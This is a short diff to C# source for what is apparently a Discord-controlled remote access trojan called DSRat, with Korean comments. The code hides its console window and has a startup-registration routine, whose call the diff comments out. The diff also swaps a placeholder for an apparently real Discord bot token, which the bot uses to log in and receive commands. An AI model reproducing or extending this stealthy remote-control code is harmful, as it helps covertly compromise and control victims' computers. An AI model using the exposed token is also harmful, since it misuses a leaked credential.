@@ -27,7 +27,7 @@ namespace DSRat
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
             new Program().BotMain().GetAwaiter().GetResult();
-            MakeThisAppAutoRunOnStartUp();
+            //MakeThisAppAutoRunOnStartUp();
         }
         public static void MakeThisAppAutoRunOnStartUp() // 시작프로그램 등록
         {
@@ -48,7 +48,7 @@ namespace DSRat
             });
 
 
-            await client.LoginAsync(TokenType.Bot, "Discord Bot Token Here"); //봇의 토큰을 사용해 서버에 로그인
+            await client.LoginAsync(TokenType.Bot, "OTIzMTQ4MDE3NjM1MzI4MDAx.YcLylg.6LZ5MWw5L_6kaZETbbYY9sOxFMI"); //봇의 토큰을 사용해 서버에 로그인
             await client.StartAsync();                         //봇이 이벤트를 수신하기 시작
 
             client.MessageReceived += OnClientMessage;         //봇이 메시지를 수신할 때 처리하도록 설정
